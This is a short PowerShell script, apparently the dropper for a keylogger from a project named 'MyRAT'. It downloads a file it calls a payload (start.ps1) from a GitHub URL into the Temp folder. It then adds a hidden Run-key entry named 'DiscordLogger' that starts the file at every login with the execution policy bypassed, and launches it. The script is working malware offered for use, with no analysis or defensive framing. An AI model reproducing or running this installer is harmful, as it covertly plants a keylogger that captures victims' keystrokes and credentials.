
$scriptPath = "$env:Temp\keylogger"
mkdir $scriptPath
cd $scriptPath
Invoke-WebRequest -Uri "https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/start.ps1" -OutFile start.ps1
#Download payload start.ps1

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

Set-ItemProperty -Path $regPath -Name "DiscordLogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath\start.ps1`""

Start-Process -FilePath "start.ps1"